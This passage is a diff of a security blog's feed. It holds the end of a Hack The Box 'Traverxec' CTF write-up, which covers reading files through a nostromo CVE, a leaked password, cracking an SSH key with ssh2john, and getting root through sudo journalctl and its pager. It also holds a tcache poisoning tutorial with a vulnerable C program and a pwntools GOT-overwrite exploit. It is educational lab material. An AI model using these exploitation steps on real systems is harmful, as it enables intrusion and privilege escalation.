+&lt;p&gt;another web page ? okay. after enumerating more , i end up trying to accessing /home/david
+via CVE-2019-16278 and i got nothing but , i remember about our homedirs , there is
+a configuration like this :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;homedirs		/home
+homedirs_public		public_www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;so i asume public_www must be exist inside /home/david/ so when i try to access via /home/david/public_www i got something:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-231902_166x88_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;a directory called protected-file-area , and it’s contain a file&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;backup-ssh-identity-files.tgz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;okay let’s download the file via browser by accessing the link&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.165/~david/protected-file-area/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and i got a prompt like this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-232159_573x158_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so let’s use david as our username and Nowonly4me as our password
+and we are in&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-232309_854x194_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;crack-rsa-private-key&quot;&gt;Crack Rsa Private Key&lt;/h1&gt;
+
+&lt;p&gt;after download the file , i got .ssh directory and some files&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;authorized_keys
+id_rsa
+id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;okay , from now we got a private key right ? so lets crack the private key
+to get the passphrase , i use ssh2john and pipe it to a file , you can download ssh2john &lt;a href=&quot;https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py&quot;&gt;here&lt;/a&gt;
+and now lets crack it&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-233106_817x194_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;nice , we got the passphrase , now lets try to login via ssh as david&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-233259_878x133_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;rooting-machine&quot;&gt;Rooting Machine&lt;/h1&gt;
+
+&lt;p&gt;after login i found something inside /home/david/bin&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server-stats.head
+server-stats.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and this is server-stats.sh&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash2
+
+cat /home/david/bin/server-stats.head
+echo &quot;Load: `/usr/bin/uptime`&quot;
+echo &quot; &quot;
+echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;
+echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;
+echo &quot; &quot;
+echo &quot;Last 5 journal log lines:&quot;
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and this is what i got , if i run the script&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-233729_640x250_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;it’s look like journalctl running as root , so it possible to us to escalate via
+journalctl.&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;after reading on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/journalctl/&quot;&gt;here&lt;/a&gt;
+i found that journalctl is using less as default pager , so if the size of our terminal
+is too small to load the output it will pipe to less . firstly we copy last line of server-stats.sh and remove pipe , like this&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and run it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-10-150815_564x388_scrot.png&quot; /&gt;&lt;/p&gt;</content><author><name>arsalan</name></author><category term="ctf-writeup" /><category term="hackthebox" /><summary type="html">Traverxec</summary></entry><entry><title type="html">Tcache Poisoning [heap exploitation]</title><link href="http://localhost:4000/research/2019/09/09/tcache_poisoning.html" rel="alternate" type="text/html" title="Tcache Poisoning [heap exploitation]" /><published>2019-09-09T10:59:00+07:00</published><updated>2019-09-09T10:59:00+07:00</updated><id>http://localhost:4000/research/2019/09/09/tcache_poisoning</id><content type="html" xml:base="http://localhost:4000/research/2019/09/09/tcache_poisoning.html">&lt;h1 id=&quot;tcache-poisoning&quot;&gt;Tcache Poisoning&lt;/h1&gt;
+&lt;p&gt;what is tcache poisoning ?
 In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc.
 and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team&lt;/p&gt;
 
@@ -163,7 +497,7 @@ We got the control
 &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;u_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SZ_FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
@@ -174,7 +508,7 @@ We got the control
 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;     __                      __                           _                      _              &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;    / /_ _____ ____ _ _____ / /_   ___     ____   ____   (_)_____ ____   ____   (_)____   ____ _&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;   / __// ___// __ `// ___// __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / _ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;   / __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / // ___// __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / // __ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / __ `/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -183,7 +517,7 @@ We got the control
 &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;       HackerClass Gunadarma @2019     /_/        author: arsalan (tripoloski)         /____/   &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+---------------------+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;|         Menu        |&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;+---------------------+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -194,16 +528,16 @@ We got the control
 	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;| select [1-3] : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[?] size : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;c1&quot;&gt;//read(0,size , sizeof(size));
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;//read(0,size , sizeof(size));&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[?] data : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -212,11 +546,11 @@ We got the control
 	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] memory allocated!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;release_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;release_memory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
@@ -234,7 +568,7 @@ We got the control
 				&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] exiting...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 				&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
 				&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[!] invalid choice error code 1902&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
@@ -248,7 +582,7 @@ free(0)
 free(0)
 malloc(0x100) &amp;lt;------ control rdi
 malloc(0x100) &amp;lt;------ just a padding
-malloc(0x100) &amp;lt;------ another control 
+malloc(0x100) &amp;lt;------ another control
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;how-can-it-be-&quot;&gt;how can it be ?&lt;/h3&gt;
@@ -302,15 +636,15 @@ $r15   : 0x0
 
 &lt;span class=&quot;n&quot;&gt;win_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400827&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;exit_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000601348&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#gdb.attach(r)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#gdb.attach(r)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;win_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -340,7 +674,7 @@ ctf{y0u_must_b3_a_pwnerrrr!!!!!}
 
 &lt;p&gt;as you can see there’s string &lt;strong&gt;&lt;em&gt;ctf{y0u_must_b3_a_pwnerrrr!!!!!}&lt;/em&gt;&lt;/strong&gt;. it mean our win() function has been called and give us data from file flag.txt, you can see what win() actually do here&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SZ_FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
@@ -349,20 +683,7 @@ ctf{y0u_must_b3_a_pwnerrrr!!!!!}
 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SZ_FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
